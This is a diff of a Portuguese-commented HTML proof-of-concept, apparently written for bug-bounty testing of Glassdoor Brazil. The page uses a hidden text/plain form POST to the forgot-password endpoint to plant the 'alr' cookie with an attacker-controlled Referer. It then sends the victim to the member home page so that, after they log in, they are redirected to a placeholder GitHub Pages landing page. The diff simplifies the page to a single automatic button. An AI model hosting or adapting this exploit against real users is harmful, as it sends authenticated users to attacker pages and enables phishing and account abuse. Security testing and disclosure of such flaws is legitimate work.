@@ -1,13 +1,12 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Glassdoor Redirect PoC – alr</title>
+<title>Glassdoor Redirect PoC – alr home</title>
 <body>
 <h2>PoC – Open Redirect via cookie <code>alr</code></h2>
 <p>
 1) Clique <b>Preparar redirecionamento</b> para setar <code>alr</code> apontando para este GitHub Pages.<br>
-2) Depois clique <b>Ir para a home</b> para abrir <code>/index.htm</code>. Na home, use o botão “Entrar” (popup), faça o login normalmente.<br>
-3) Se o fluxo consumir <code>alr</code>, após autenticar você cairá nesta origem (arquivo <code>after-login.html</code>).<br>
-4) Opcional: teste o botão <b>Forçar logout (teste de consumo)</b>; alguns fluxos consomem <code>alr</code> no logout.
+2) A página então abrirá <code>/member/home/index.htm</code>. Se o Glassdoor consumir o cookie,
+você será redirecionado para <code>after-login.html</code> (seu domínio externo).<br>
 </p>
 
 <script>
@@ -15,10 +14,8 @@
   const attackerLanding = "https://SEU-USUARIO.github.io/SEU-REPO/after-login.html";
 </script>
 
-<!-- iframe oculto para receber a resposta do POST -->
 <iframe id="sink" name="sink" style="display:none"></iframe>
 
-<!-- POST sem preflight para setar o cookie alr com o Referer desta página -->
 <form id="prime" action="https://www.glassdoor.com.br/auth/account/password/forgot/initiate"
       method="POST" enctype="text/plain" target="sink">
   <textarea name="" id="payload" style="display:none">
@@ -26,43 +23,15 @@
   </textarea>
 </form>
 
-<button id="prep">Preparar redirecionamento (setar alr)</button>
-<button id="home">Ir para a home (index.htm)</button>
-<button id="logout">Forçar logout (teste de consumo)</button>
+<button id="prep">Preparar redirecionamento + ir para /member/home</button>
 
 <script>
-  const prep = document.getElementById('prep');
-  const home = document.getElementById('home');
-  const logout = document.getElementById('logout');
-
-  prep.onclick = function () {
-    // envia o POST via <form> (sem CORS/preflight). O backend gravará 'alr' usando o Referer desta página.
+  document.getElementById('prep').onclick = function () {
     document.getElementById('prime').submit();
-    // opcional: espere um pouco
-    prep.disabled = true;
-    setTimeout(() => { prep.disabled = false; }, 1500);
-  };
-
-  // abre a página onde o login por popup acontece
-  home.onclick = function () {
-    // use target=_blank se preferir abrir em nova aba: window.open(...)
-    window.location.href = "https://www.glassdoor.com.br/index.htm";
-  };
-
-  // alguns sites consomem 'alr' no logout (útil para provar redirect sem precisar logar)
-  logout.onclick = function () {
-    window.location.href = "https://www.glassdoor.com.br/auth/logout";
+    setTimeout(() => {
+      // vai direto para o endpoint que vimos no Burp
+      window.location.href = "https://www.glassdoor.com.br/member/home/index.htm";
+    }, 1200);
   };
 </script>
-
-<hr>
-<p style="font-size:12px;color:#666">
-Dicas de validação:
-<ul>
-  <li>Depois de clicar <b>Preparar redirecionamento</b>, abra DevTools → Application → Cookies → <code>https://www.glassdoor.com.br</code> e confira se existe um cookie <code>alr</code> apontando para <code><span id="alr"></span></code>.</li>
-  <li>Vá para a home, clique “Entrar”, finalize o login. Se o fluxo consumir <code>alr</code>, você cairá em <code>after-login.html</code> (neste domínio).</li>
-  <li>Se não consumir no login via popup, teste o botão de <b>logout</b>. Se redirecionar para cá, já é prova de open redirect pós-auth.</li>
-</ul>
-</p>
-<script>document.getElementById('alr').textContent = attackerLanding;</script>
 </body>
